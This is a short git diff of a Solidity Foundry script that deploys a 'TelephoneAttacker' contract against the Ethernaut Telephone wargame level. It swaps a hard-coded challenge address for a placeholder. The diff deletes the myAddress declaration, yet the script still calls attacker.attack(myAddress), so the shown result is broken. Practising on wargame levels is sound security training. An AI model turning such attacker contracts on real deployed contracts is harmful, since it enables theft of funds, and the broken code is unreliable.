@@ -5,12 +5,11 @@ import "forge-std/Script.sol";
 import "../src/Ethernaut Challenge/04_Telephone.sol";
 
 contract ExploitScript is Script {
-    address myAddress = vm.envAddress("ACCOUNT_ADDRESS");
 
     function run() external {
         vm.startBroadcast();
 
-        TelephoneAttacker attacker = new TelephoneAttacker(0x5ac9D22d642Ba1ab5aa2Dd5bad078762B2cD09a0);    
+        TelephoneAttacker attacker = new TelephoneAttacker(your_challenge_address);    
         attacker.attack(myAddress);
 
         vm.stopBroadcast();
@@ -18,7 +17,6 @@ contract ExploitScript is Script {
 }
 
 contract TelephoneAttacker {
-    
     Telephone public level04;
     
     constructor(address _target) {
